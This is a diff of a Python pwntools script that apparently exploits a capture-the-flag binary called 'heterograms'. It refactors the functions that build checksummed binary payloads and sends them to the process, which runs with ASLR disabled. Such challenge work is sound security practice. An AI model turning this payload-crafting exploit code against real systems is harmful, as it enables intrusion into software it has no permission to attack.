@@ -20,7 +20,7 @@ def make_breakpoints(breakpoints: List[str]) -> List[str]:
 def make_commands(args: List[str]) -> List[str]:
     return flatten(map(lambda a: ['-ex', a], args))
 
-def generate_checksum(a: List[int]) -> int:
+def checksum(a: List[int]) -> int:
     x = 0
 
     for item in a:
@@ -32,18 +32,28 @@ def generate_checksum(a: List[int]) -> int:
     return ~x
 
 
-def generate_word_payload(word_cmd: List[int], before_word_cmds: List[int] = []) -> bytes:
-    data = chksum_placeholder + before_word_cmds + loop_one + [len(word_cmd)] + word_cmd
-    return generate_payload(data)
+def generate_word_payload(word: str, cnt = 0) -> bytes:
+    data = counter_cmd(cnt) + word_cmd(word)
+    return make_payload(data)
 
-def generate_copy_payload(cnt_num = 0) -> bytes:
-    data = chksum_placeholder + loop_two * 2 + loop_zero + [cnt_num] + loop_one + [2] + [0] * 2
-    return generate_payload(data)
+def generate_copy_payload(cnt = 0) -> bytes:
+    data = copy_cmd() + counter_cmd(cnt)
+    return make_payload(data)
 
-def generate_payload(data: List[int]) -> bytes:
-    payload = [ len(data) ] + data
-    payload[1] = generate_checksum(payload[2:])
+def make_payload(data: List[int]) -> bytes:
+    payload = [ len(data) + 1 ] + chksum_placeholder + data
+    payload[1] = checksum(payload[2:])
     return flat(payload, word_size=8)
+
+def counter_cmd(cnt = 0) -> List[int]:
+    return loop_zero + [cnt]
+
+def word_cmd(word: str) -> List[int]:
+    idxs = to_indices(word)
+    return loop_one + [len(idxs)] + idxs
+
+def copy_cmd() -> List[int]:
+    return loop_two * 2
 
 
 def to_indices(s: str) -> List[int]:
@@ -96,8 +106,8 @@ with process('./heterograms', aslr=False) as p:
         print(p.recvline())
 
         payload = generate_word_payload(
-            word_cmd=to_indices(word),
-            before_word_cmds=loop_zero + [idx]
+            word=word,
+            cnt=idx
         )
         print(payload)
         if not is_remote and idx == 7:
